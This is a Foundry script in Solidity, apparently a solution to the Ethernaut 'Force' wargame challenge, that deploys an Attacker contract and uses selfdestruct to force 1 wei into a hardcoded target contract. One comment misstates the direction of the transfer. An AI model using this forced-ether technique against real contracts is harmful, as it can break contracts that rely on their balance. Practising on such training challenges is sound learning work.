// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Force} from "../src/Force.sol";

contract Attacker {
    address payable private receiver = payable(0xb6c2Ec883DaAac76D8922519E63f875c2ec65575);

     /**
     * @notice The destroyContract function uses the selfdestruct opcode to destroy the contract 
     *         and send any remaining Ether to the specified receiver.
     */
    function destroyContract() payable external {
        selfdestruct(receiver);
    }

    // Fallback receive function to accept Ether.
    receive() payable external {}
}
/// @author agadzhalov
/// @title Solution to Force Ethernaut challenge
/// @notice Solution: selfdestruct (deprecated) previously erased the contract bytecode from the chain. 
///         From the Cancun hard fork selfdestruct only transfers its Ether to the beneficiar. 
contract ForceScript is Script {
    /// @notice Instance of the Force contract to interact with.
    Force public force = Force(0xb6c2Ec883DaAac76D8922519E63f875c2ec65575);

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        // Deploy the Attacker contract
        Attacker attacker = new Attacker();

        // Log the initial balance of the Force contract before selfdestruct
        console.log("1. Initial balance:", address(force).balance);

        // Send 1 wei to the Attacker contract, which will trigger the receive function
        (bool success, ) = address(attacker).call{value: 1 wei}("");

        // Execute the selfdestruct function on the Attacker contract to transfer Ether from the Force contract
        attacker.destroyContract();

        // Log the balance of the Force contract after the selfdestruct operation
        console.log("2. Balance after selfdestruct:", address(force).balance);

        vm.stopBroadcast();
    }
}
